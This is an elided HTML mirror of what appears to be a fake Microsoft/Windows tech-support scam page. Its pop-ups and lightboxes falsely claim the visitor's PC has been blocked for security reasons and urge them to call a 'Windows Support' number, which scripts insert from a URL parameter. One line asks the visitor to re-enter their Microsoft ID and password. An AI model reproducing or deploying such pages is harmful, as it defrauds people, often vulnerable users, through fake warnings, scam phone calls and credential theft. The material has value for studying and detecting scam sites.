...
<html lang="en">
<!-- Mirrored from zihanz29.z13.web.core.windows.net/win/index.html?call=xxxxx by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Apr 2025 00:53:25 GMT -->
     ...
     <audio id="pridez1" loop>
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              ...
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write('xxxxx'+call)</script>
                </span>
              </span>
            </div>
          </div>
      ...
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        ...
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">Windows Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px"><script>document.write('xxxxx'+call)</script>
            </span>
          </span>
        </div>
        <div id="bottom">
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         ...
         <p style="padding-bottom:0;color:#fff;font-size:16px">Windows Please call support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write('xxxxx'+call)</script>
            </span>
          </strong>
        </p>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this PC has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"><script>document.write('xxxxx'+call)</script>
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        ...
        <h4 style="font-weight:600;color:#0F396D;font-size:22px"><script>document.write('xxxxx'+call)</script>
...
<br>Please log in again using your Microsoft ID and password.<br>For assistance, contact Microsoft Support<br><strong><script>document.write('xxxxx'+call)</script></strong></p>
...
<!-- Mirrored from zihanz29.z13.web.core.windows.net/win/index.html?call=xxxxx by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Apr 2025 00:54:05 GMT -->
</html>